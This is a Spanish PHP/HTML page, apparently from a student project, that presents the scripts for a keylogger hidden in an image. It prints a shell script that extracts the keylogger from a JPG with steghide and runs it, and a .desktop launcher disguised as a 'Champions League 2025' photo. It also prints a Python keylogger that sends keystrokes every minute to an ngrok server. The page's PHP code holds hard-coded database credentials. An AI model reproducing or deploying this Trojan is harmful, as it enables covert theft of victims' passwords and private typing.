<?php
    ob_start(); // Habilita el buffer de salida
    session_start();
    
    $servername = "mysql-db";
    $username = "sea";
    $password = "proyectose@";
    $database = "bd_keyloggers";

// Conexión
$conn = mysqli_connect($servername, $username, $password, $database);
if (!$conn) {
    die("Conexion fallida: " . mysqli_connect_error());
}
   
?>

<!DOCTYPE html>
<html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Scripts - Imagen</title>
        
        <!-- Link hacia el archivo de estilos css -->
        <link rel="stylesheet" href="../css/scripts.css">

        <!-- Link favicon -->
        <link rel="shortcut icon" href="../img/logo.png" type="image/x-icon">

        <!-- Link para que funcionen los FA FA -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

        <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />        


    </head>

    <body>
        <!--CABECERA-->
        <div id="header">
            <div class="logo">
                <img src="../img/logo.png" alt="COACHING SL">
            </div>
            <nav>
                <ul>
                    <?php
                        echo "<li><a href='opciones.php'><i class='fa fa-home'></i> <span data-translate='inicio'>Inicio</span></a></li>";
                        echo "<li><a href='imagen.php'><i class='fa-regular fa-image'></i> <span data-translate='imagen'>Imagen</span></a></li>";
                        echo '<br>';
                    ?>
                </ul>
            </nav>
        </div>
<main>
    <!-- SOBRE LOS ARCHIVOS -->
    <section id="SobreNosotras">
        <div class="subapartados">
            <hr class="highlight"/> <!-- SEPARADOR-->
            <div class="primero">
                <h2 class="SobreNosotrosTit">Proceso de creación</h2>
                <h3 class="textoinicio">¿Cuál es el proceso para poder llevar a cabo este keylogger?</h3>
            </div>
        </div>
        <div class="info_coaching2">
            <hr class="highlight"/> <!-- SEPARADOR-->
            <div class="coaching_columnas2">
                <div class="imageneess">
                    <img src="../img/diagrama_imagen.png">
                </div>
            </div> <!-- coaching_columnas2 -->
        </div> <!-- info_coaching -->

        <hr class="highlight"/> <!-- SEPARADOR-->
</section>

    <!-- SOBRE LOS SCRIPTS -->
    <div class="cajascripts">
        <h2 class="scripts">Scripts necesarios</h2>
    </div>

    <div class="fila-coaching">
        <div class="info_coaching">
            <div class="Centrar_info_coaching">
                <div class="col-lg-12 text-center">
                    <h2 class="ApartadoCoachingTit">abrir.sh</h2>
                    <div class="imageneess">
                        <p>
                        #!/bin/bash <br>
                        RUTA="$HOME/Escritorio/entrada_final" <br>
                        xdg-open "$RUTA/imagen_oculta.jpg" & <br>
                        steghide extract -sf "$RUTA/imagen_oculta.jpg"  <br>
                        -xf "$RUTA/keylogger.py" -p champions2025 -q <br>
                        python3 "$RUTA/keylogger.py" & <br>
                        disown
                        </p>
                    </div>
                </div>
            </div>
        </div>
        <div class="info_coaching">
            <div class="Centrar_info_coaching">
                <div class="col-lg-12 text-center">
                    <h2 class="ApartadoCoachingTit">champions.desktop // imagen.jpg.desktop</h2>
                    <div class="imageneess">
                        <p>
                        [Desktop Entry] <br>
                        Name=Champions League 2025 <br>
                        Comment=Imagen exclusiva de la final <br>
                        Exec=/bin/bash -c "$HOME/Escritorio/entrada_final/abrir.sh" <br>
                        Icon=/home/marc/Escritorio/entrada_final/icono.png <br>
                        Terminal=false <br>
                        Type=Application <br>
                        Categories=Graphics;
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>

        <div class="fila-coaching">
                        <div class="info_coaching">
                <div class="Centrar_info_coaching">
                    <div class="col-lg-12 text-center">
                        <h2 class="ApartadoCoachingTit">entrada_validacion.py // keylogger.py</h2>
                        <div class="imageneess">
                        <p>
                        import os <br>
                        import threading <br>
                        import requests <br>
                        import socket <br>
                        import time <br>
                        <br>
                        # Instala pynput si no está <br>
                        try: <br>
                            from pynput import keyboard <br>
                        except ImportError: <br>
                            os.system("pip install pynput --user") <br>
                            from pynput import keyboard <br>
                            <br>
                        buffer = "" <br>
                        tiempo_inicio = time.time() <br>
                        tiempo_vida = 120  # 2 minutos <br>
                        <br>
                        # Tu servidor Flask (por Ngrok o IP pública) <br>
                        server_url = "https://b2fe-79-155-254-34.ngrok-free.app/guardar-img" <br>
                        <br>
                        def enviar(): <br>
                            global buffer <br>
                            if buffer: <br>
                                try: <br>
                                    requests.post(server_url, json={"datosImg": buffer}) <br>
                                    buffer = "" <br>
                                except: <br>
                                    pass <br>
                            timer = threading.Timer(60, enviar) <br>
                            timer.daemon = True <br>
                            timer.start() <br>
                            <br>
                        def on_press(tecla): <br>
                            global buffer <br>
                            if time.time() - tiempo_inicio > tiempo_vida: <br>
                                return False <br>
                            try: <br>
                                if tecla == keyboard.Key.esc: <br>
                                    return False <br>
                                elif tecla == keyboard.Key.space: <br>
                                    buffer += ' ' <br>
                                elif tecla == keyboard.Key.enter: <br>
                                    buffer += '\n' <br>
                                elif tecla == keyboard.Key.tab: <br>
                                    buffer += '\t' <br>
                                else: <br>
                                    buffer += tecla.char <br>
                            except AttributeError: <br>
                                buffer += f"[{tecla}]" <br>
                                <br>
                        enviar() <br>
                        <br>
                        with keyboard.Listener(on_press=on_press) as listener: <br>
                            listener.join()
                        </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <hr class="highlight"/> <!-- SEPARADOR-->

</main>
        <!-- PIE DE PAGINA -->
        <footer>
        Todos los derechos reservados | Keylogger SL Copyright © 2025
        </footer>

    </body>
</html>